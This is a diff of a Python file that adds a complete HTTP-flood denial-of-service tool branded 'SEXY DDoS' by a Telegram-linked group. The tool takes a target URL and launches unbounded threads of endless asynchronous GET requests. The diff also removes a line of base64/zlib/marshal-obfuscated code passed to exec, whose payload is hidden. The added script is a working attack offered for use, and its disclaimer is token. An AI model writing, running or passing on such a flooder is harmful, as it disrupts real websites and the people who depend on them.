@@ -1,3 +1,132 @@
-# https://t.me/usnexushacker
-# Maked By RSBD
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==QCZJcTD8fMO8BS4WinwVEH3gvxGuh55dYc3/1LCHpf+eg2/+E09+FBY9XVVzX0kouVD7GwEM3E1EiCa+iNJVcLi174YNItSqh/t79BMF6igVnm+3tY0e9Z7628bnobcHUVjUf76Z29OT/LHN7uX0dtYvNdO/uno3ldus7jXepB/yp0uYISBjFjQQKY5La52qAymtFYsrGEANckpVxISItLTYhNdqpCbZRmkTLzzODIsNA4ltuT3QVUIIBtIq7oWWkKdvsWAqCHKDk+I1PgYX1hA3ZgtLSkD1lIu38un39cYW2dwoVVhrJCf1wlXVtfpJ7S/22q+ttQV3/e8+6dHrfO4pCOIUqpsoFYZt9Lguv6/E+mMp9uFAjXwxJ/sOJmDLO28twODY+EJdqCMVen4PhwY9ECrg2Spws2WYdT43CjY+iKsDfezCcteCAo/ZxA4bxTX3rtW35yWmvlbJe3OemJxDURXk8r/ZZv+vgmkdmPlNNbmX88xhfMOILKDIS4CZLFhgX+4l1oLaaofhuYSVH1PhMdLaAa+gnL3hNiP+aF9ly/SDrHFVIezrZuMPfM5xemlAAhXUUA9cPFwfweCAfEclJwtt+pf2lF1DNLcQUtttLzutoRobxryc0z7kZL200MKnWm0ZmYywaKv6HaSNA6h2koalBFNM5UAYgL33E+bczLUCNbd/VJw2WvTTSD3qLaBOrc53gBNvc5UP42dLDEsxtvtFkt3zkaNQZUDJSnvXgtvM+s33E69JYnlQjJP/dfW/DlvMMJdgQaIM4AOqEtRDMnY8rwZ+jSqztwu4OeQLeHz9BZ4OGGV3IPRSI7XiBewNx4R5ZJeo8BfuBgF1jD1tmGK9ZU1rbJxu2GM1pUwdlZEi85ie0EMomm2DD1hLFHE2KoP10U1ZclkAXBKNZGHAmJIZx3ILoi9DT7cg/qJ+xhY8G5ElpI6Je4DHDyP6mguQA40UAcQfUCyybDWwlPOu6XNhGdUkejWz5nG5e0cgHie8ByGSvsGNFpMlw2bDslRayRniKjr9IR9OUvJx3nMMmf7gYmx7mE4vu0sUGwVHHQciJeqtpJesx6RKA938ik2wiRAvaqr6ipF2ylyr9fNeq94XbvvshZc12i3ZdFCSGhPkNAX9MQG6eWS6eA/ep7pMYP+ck2PsCiWdsxdoFURKdb0Y6wcOiRPAlCwU4gMPMq63o30mtXxg55Gy1mC4IUPzwc/CpG7tr1Inksr1mVYA1A8jyv2PCPfBzz9PN9/MK1daAK93H3N8Bie/z3B4A/lAloByM2a71du57UcZfxW3tSbfXnfvob8vgOaQL6oxlLzJH40pLk9pkPXuJGkdhL4OKugTNrugLN6luhCgC7VcIYF2ZwaZTCa5OYx0mMlc0ciUUPYMAoc5DBa3luJG9Sn1FNRZlHQQH8YGl0f66I4UHhRZQM4GN+zJFRVf60mXBhJmQIqpDlckFKpg28XJBVhCe6WbOpxXoERQ9GuGxA+wDFAFl/8pXVvRH2XB+s798Xnr1QOlflndU6mNqJvdBZw31TactG54qzwHAn6zeGApph5L/wMruqmrwMaUOUJ0obg89kg+WCGSRfLHuXBT8Ovg5OGQwDB3XL+5Uo+OkDozWPuf/eBP189O4/+dRHtz1b2oCHeBl4Z5AIiuXVEafoW9/PL7pOx+1ThX7yDr2t8dZNK+dbezW8tcGirEXEv60CpBcKeq0z89JLw9p/1G4+7D3EdMrfRrLHdzwba8N6zHOv735bWydWthrl77LcitSnLyM7L5ExVgqt7cCu5++HDFxXpLJvusuZIIBvwwX4Da5Yc+DNYXzaz+yvV9pfhik+h3bdfzVtfXVvs3F6ctZK+WKZMR7FHdZrt0+uysjGwyOaUlI9d+v4+psvslmWM+HRIEaqsd8XgPU9YQIkiku7rmm7huGbunv+5oX3/p1lbVX2G5SASzCHdD7K2BchK1CI/Gtdl0MQbD+m89h9PN+f07HOoHFyGGzIDZ6HMxO/P3rMSFq401uzoELVZmDB9rlJYgNZtlGUiIMOM+yHKEFpDrqaP1UKAfEBGhaQUgXbNYIVQQg7q2V4KvnCDlDKr9QEHnjwaIl0dUPiIOJcqDKpFGIph20wGKd0UR26NNbBVlQO+4THT/NBYJHF6U8de1RA8QVyBHAHBqLMq/YkDIEjDrJWaMshqm0hGEpluqA75WQmg4acWgz0iShc78sd+nNnV4T++Uc+AZ6qEOYcagovxNlU9J0jGvCeE3Xcl8YleGVGlfwyhqrhX6LF0xYwACp4B777AOe1+0vIFE3gYgkIChjE0wH1z6LFvmqKqdtod2JNV13gLga7D2X9p/gnq5ORk6ePjY1VX7owne4DOcMnxf926yj224p1e+wqFnzhafYpl/F0HbpaJH/7bX/QaFasu/gVMq97EIF5YDAnKWqWPbEjVhl2IDPr7RXeL70uRJo4AE0MxbWeIEdIVvShCILvmlF+nvgaYHVhax82O+VNc1xj+lhxxERnWqXWYvFS972gsw8cy+FmWmAvP37A+EC8+J+arSa3/+awUOLXoq+8Qm1g27YcZUNaO/qQ8yXdYazHaNYAs8POrpuY/39zE7jfS4UStTQyyzXHSTwZUjQ4SPGDHHW2+4ZqH9hI40S+QhEPcm//frhZICwZCwXBOhx86R53b3fuhnkpc7Wsum4I8wIWjM9QkLWIfQRcSh53VKFe1nfWiX0rv2/gJJxjGcdo/DH8A7JDOyPOMsOWUELRImCxxPGFSobe+VEQuBjQfoimjtBTfZYEOO5xQleq0k2kJ/EEhKcm5ESq+okWoxmuSasNQtuTDVjVHNwg8e3tFXEoBnLDPdQRylbRXB+RyOr1gtRaeuBx8cDp5LlE3zty9eVi5xF8VZ2AK3upjf3DrILl45/AC3dch/bqtWp6FqZvb1SPYJrE4qIrwq8wsUVNW6qELf2gVnHzhmWttHR6iaf4sNaxwVVx/5JrZ5yvMnKfGge9Ch/yXtU7K3OuvQ0e/4oHLYIV0eZByCrl4tRWTHXPU9LzpyHS2v7TZtU7iL9+4J6IcEQ63Q8dSvfHb1FHR5H1/zNKqL5pTY6TWPJPqsuSfRpHaon6OpVdxpsG+xSept2TpwDnEivoOqAYHvMTPiSCkDjnjQl0d0wrLCo86TDfPKno3EYglfmyP+xJz893UUUG0TaSHOCjUkIcj7jmkmKcq3SAkjYSTL1VEbWNQNa/9QkOjT8Z6GKGTSIF0HuyRMCtI/u1RWQFKM19lCTpAP8xNXEMhg5ZC0ZlBwgCYAoDeCMGStKZDt/2Wy/p++jIw7RR2Gy+4uD6cn+mdLnRAwfRvYw2zFn0RWl318BWcDY/7+zElySSf2eKptEuOMcFyCLnxr5cmoOTc3OyuPgtgMayIyT56a1B2HsNqcWuC2qaRNhmxOLl9cTqNDl093UiuvHYvxrfmjK7OZ9P98lUbeUMbLuAriFvKO75hD3qvx4xWuAeC6otEPBseoZ11DurvlBbn3kp52Ig+cy5Z9Jmx4663U7KWbBs8a2wcZ4wV/QFR/ZJwedNpkwSTCWdzRwqWBiSj3Ipaz7Gy93xbkoZVdPGVlwvFrR8gLnN4D3NrBFFvr8o+AAKXjgp8gKeiDIN1dEBR/U4QFWBPuKKe8DITWBJ4WVhEZcJTu1HyPpBEF18XIcYpMN3EQ8LuF/jey94X0juGbzexxIT23OGp3uyxMl12CiUhCEKJAWBLe7fShfugnwd3075vdTvmPff8+9Z2pEpMcGvurPzqzPQ8jYdPZOpVZxqloWxtdWe4nvSb+/p6HpCEsRV7NkSqt2caK7B1QglN6oxewuz768ZYvDfrLxigDZcSRhUJgNOcnmCkkQCYPz4ZIszGHTj87+9utv91dMFs1GGtyJe'))
+import colorama
+import threading 
+import aiohttp
+import asyncio
+import subprocess
+import multiprocess
+import sys
+import time
+from time import sleep
+from pystyle import *
+import os
+
+#//Gui Start//#
+ 
+
+headers = {
+  "User-Agent": "Flyier DoS"
+}
+
+osystem = sys.platform
+
+if osystem == "linux":
+  os.system("clear")
+else:
+  os.system("cls")
+print("""
+
+{+} US ~ DDOS - RSBD DDOS
+
+{+} Contact me by Telegram if you have any issue: @usnexusfuckinge404
+
+""")
+time.sleep(2.5)
+
+
+if osystem == "linux":
+  os.system("clear")
+else:
+  os.system("cls")
+  
+time.sleep(1)
+ascii = r'''
+
+╔════╦═══╦═══╦═╗╔═╗╔═══╦═══╦══╗╔═══╗
+║╔╗╔╗║╔══╣╔═╗║║╚╝║║║╔═╗║╔═╗║╔╗║╚╗╔╗║
+╚╝║║╚╣╚══╣║─║║╔╗╔╗║║╚═╝║╚══╣╚╝╚╗║║║║
+──║║─║╔══╣╚═╝║║║║║║║╔╗╔╩══╗║╔═╗║║║║║
+──║║─║╚══╣╔═╗║║║║║║║║║╚╣╚═╝║╚═╝╠╝╚╝║
+──╚╝─╚═══╩╝─╚╩╝╚╝╚╝╚╝╚═╩═══╩═══╩═══╝
+          SEXY ~ DDoS
+[!] Do not use this tool for illegal purposes ~ This Python Created By @usnexushacker
+
+
+
+{+} Created By US NEXUS HACKER ~ TEAM RSBD ~ Main Owner Nexus Cyber
+ '''
+
+
+
+
+banner = r"""
+SEXY DDOS """.replace('▓', '▀')
+
+
+banner = Add.Add(ascii, banner, center=True)
+
+ 
+
+ 
+print(Colorate.Horizontal(Colors.red_to_blue, banner))
+#//Gui End//#
+num = 0
+reqs = []
+loop = asyncio.new_event_loop()
+r = 0
+url = input("{?} Enter Web Url-> ")
+print()
+time.sleep(1)
+if url.startswith("http") or url.startswith("https"):
+  pass
+else:
+  url = "http://"+url
+
+  print(url)
+async def fetch(session, url):
+    global r, reqs
+    start = int(time.time())
+    while True:
+      async with session.get(url, headers=headers) as response:
+        if response:
+          set_end = int(time.time())
+          set_final = start - set_end
+          final = str(set_final).replace("-", "")
+ 
+          if response.status == 200:
+            r += 1
+          reqs.append(response.status)
+          sys.stdout.write(f"Requests : {str(len(reqs))} | Time : {final} | Response Status Code => {str(response.status)}\r")
+        else:
+          print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))
+
+
+
+urls = []
+urls.append(url)
+
+async def main():
+  tasks = []
+  async with aiohttp.ClientSession() as session:
+    for url in urls:
+      tasks.append(fetch(session, url))
+    ddos = await asyncio.gather(*tasks)
+
+def run():
+    loop.run_forever(asyncio.run(main()))
+
+
+if __name__ == '__main__':
+  active = []
+  ths = []
+  while True:
+    try:
+      while True:
+        th = threading.Thread(target=run)
+        try:
+          th.start()
+          ths.append(th)
+          sys.stdout.flush()
+        except RuntimeError:
+          pass
+    except:
+      pass
